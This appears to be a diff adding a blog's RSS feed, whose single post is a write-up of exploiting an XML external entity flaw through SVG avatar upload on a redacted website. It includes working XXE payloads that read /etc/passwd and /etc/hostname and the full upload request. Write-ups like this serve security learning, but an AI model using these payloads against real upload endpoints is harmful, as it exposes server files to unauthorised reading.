@@ -1,0 +1,69 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on Atul</title>
+        <link>https://0xatul.github.io/posts/</link>
+        <description>Recent content in Posts on Atul</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <lastBuildDate>Sat, 08 Feb 2020 23:04:58 +0545</lastBuildDate>
+        <atom:link href="https://0xatul.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>External XML Entity via File Upload (SVG)</title>
+            <link>https://0xatul.github.io/posts/2020/02/external-xml-entity-via-file-upload-svg/</link>
+            <pubDate>Sat, 08 Feb 2020 23:04:58 +0545</pubDate>
+            
+            <guid>https://0xatul.github.io/posts/2020/02/external-xml-entity-via-file-upload-svg/</guid>
+            <description>Write-up: XXE-File-upload ( SVG )
+Baby paws:
+ I looked for what are the functionalites available in the WEB app just to see what are the possible attack vectors. I analyzed the WAF and found what triggers it and what are blocked characters I found a upload field that explicitly uses these three formats: PNG, XML, and EPS. ie The upload field for the avatar. That allowed me to check for imagetragick, ghost script and some fuckery over file uploads!</description>
+            <content type="html"><![CDATA[<p>Write-up:
+XXE-File-upload ( SVG )</p>
+<p>Baby paws:</p>
+<ol>
+<li>I looked for what are the functionalites available in the WEB app just to see what are the possible attack vectors.</li>
+<li>I analyzed the WAF and found what triggers it and what are blocked characters</li>
+<li>I found a upload field that explicitly uses these three formats: PNG, XML, and EPS. ie The upload field for the avatar. That allowed me to check for imagetragick, ghost script and some fuckery over file uploads!. So I was looking for some shells HTB style.</li>
+<li>I ruled out the first two and was doing more recon then I started doing some XXE things to the SVGs</li>
+<li>so lets start,
+I tried to do something this first:</li>
+</ol>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
+&lt;svg&gt;&amp;xxe;&lt;/svg&gt;
+</code></pre><p>#FAILED</p>
+<p>But god knows we tried :)</p>
+<p>so Lets add some attributes to this:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encdoing=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt; ]&gt;&lt;svg width=&quot;512px&quot; height=&quot;512px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;&lt;text font-size=&quot;14&quot; x=&quot;0&quot; y=&quot;16&quot;&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;  
+</code></pre><p>Son of a bitch I&rsquo;m in:
+Request:</p>
+<pre><code>POST /redacted/redacted/and/redacted HTTP/1.1
+Host: redacted.site
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Cookie: session=blehhhhh
+-----------------------------177039707011430280861789912306
+Content-Disposition: form-data; name=&quot;csrf&quot;
+5
+-----------------------------177039707011430280861789912306
+C
+Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;your-weekend-is-lost-you-blue-team-beta.svg&quot;
+Content-Type: image/svg+xml
+
+&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot; &gt; ]&gt;&lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;&lt;text font-size=&quot;16&quot; x=&quot;0&quot; y=&quot;16&quot;&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt; 
+
+-----------------------------177039707011430280861789912306
+</code></pre><p>Response:</p>
+<pre><code>HTTP/1.1 302 Found
+Location: /avatar/change/confirmation/redacted
+Connection: close
+Content-Length: 0
+</code></pre><p>and I see my avatar is not visible but the DOM of the site shows something like:</p>
+<pre><code>&lt;img src=&quot;/redacted/moreRedacted/avatarUser.svg&quot; class=&quot;avatar&quot;&gt;
+</code></pre><p>then I opened the image by copying the path
+<img src="https://raw.githubusercontent.com/0xatul/writeups/master/images/xxe.jpg" alt="">
+and ENDORPHINS IN and The feeling of winning an arguement with your SO and them appologizing continues</p>
+]]></content>
+        </item>
+        
+    </channel>
+</rss>
